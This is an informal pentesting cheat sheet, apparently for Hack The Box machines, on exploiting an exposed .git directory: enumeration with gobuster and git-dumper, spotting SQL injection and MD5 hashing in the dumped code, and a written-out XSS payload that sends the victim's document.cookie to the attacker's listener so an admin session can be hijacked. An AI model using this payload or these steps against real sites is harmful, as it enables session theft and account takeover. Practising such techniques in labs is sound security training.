a simple guide when you find a .git/

youy just went through a gobuster scan or a dirscan and found that your domain has a .git/
1) gobuster dir -u http ://<domain>.htb/.git -w /usr/share/wordlists/dirb/common.txt -b 404,403

2) git-dumper http://.htb/.git  
  if no permission to access it via web:
  1) go at the files you download from dumper and read them. Focus on files with names like: accept, config, values etc (use Phpstorm, go to downloads, cd PhpStorm/bin and ./phpstorm.sh)
    What you might find:
    a) "sql_insert" : if not properly, might have sqli, if there is "prepare" then its secured.
    b) "md5" : is not safe way to encypt
    c) "username" , not protected --> <script>document.location='http ://myIP:8888/?c='+document.cookie;</script> and opened a python3 -m http.server 8888
        1) might take the PHPSESSID=e3jmt3a6cknkljlag8mnnrck9k which is an admin cookie, you put it on website coockie and access the /admin.php
3) if logged in with ssh in a user:
    a) cd /var/log/apache2 , and if there is a access.log , grep <admin_name> access.log, and you gonna find his password
